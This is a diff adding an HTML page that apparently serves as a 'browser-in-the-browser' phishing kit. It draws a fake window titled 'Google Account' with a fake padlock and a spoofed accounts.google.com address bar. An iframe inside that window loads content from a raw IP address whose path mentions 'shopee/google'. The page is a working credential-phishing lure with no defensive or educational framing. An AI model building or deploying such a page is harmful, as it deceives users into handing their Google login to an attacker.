@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+<div id="window" style="position: relative; top: 4%; left: 28%;">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="./logo.svg" width="20px" height="15px" id="logo">
+			<span id="logo-description">Google Account</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">https://accounts.google.com/</span>
+		<span id="domain-path">signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ec=GAlA8wE&flowName=GlifWebSignIn&flowEntry=AddSession</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="http://128.199.133.87/shopee/google" frameBorder="0"></iframe>
+</div>
+</body>
+<script src="script.js"></script>
+</html>
+
